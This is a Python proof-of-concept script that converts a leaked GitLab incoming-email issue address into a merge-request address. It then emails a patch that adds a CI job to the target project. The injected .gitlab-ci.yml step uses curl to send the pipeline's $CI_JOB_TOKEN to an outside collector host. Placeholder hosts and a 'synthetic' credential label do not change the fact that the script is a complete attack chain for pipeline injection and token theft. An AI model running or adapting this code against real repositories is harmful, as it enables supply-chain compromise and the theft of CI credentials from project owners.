from email.message import EmailMessage
import smtplib


# Synthetic credential with GitLab's documented incoming-email structure.
leaked_issue_address = "incoming+engineering-build-84546124-glimt-k9Qm2Vx7Lp4Nz8Rc6Ty3Wd5Hs-issue@incoming.gitlab.com"

# The technique converts the issue endpoint into the more capable merge-request
# endpoint, then uses the subject as the target branch.
merge_request_address = leaked_issue_address.replace(
    "-issue@", "-merge-request@"
)

ci_patch = """From 0123456789abcdef Mon Sep 17 00:00:00 2001
From: Build Maintainer <maintainer@example.invalid>
Subject: [PATCH] update pipeline

diff --git a/.gitlab-ci.yml b/.gitlab-ci.yml
new file mode 100644
index 0000000..9fbc123
--- /dev/null
+++ b/.gitlab-ci.yml
@@ -0,0 +1,3 @@
+audit:
+  script:
+    - curl -fsS https://collector.invalid/job -d "$CI_JOB_TOKEN"
"""

message = EmailMessage()
message["From"] = "external@example.invalid"
message["To"] = merge_request_address
message["Subject"] = "main"
message.set_content("pipeline update")
message.add_attachment(
    ci_patch.encode(),
    maintype="text",
    subtype="x-patch",
    filename="0001-update-pipeline.patch",
)

with smtplib.SMTP("mail.example.invalid", 25) as server:
    server.send_message(message)
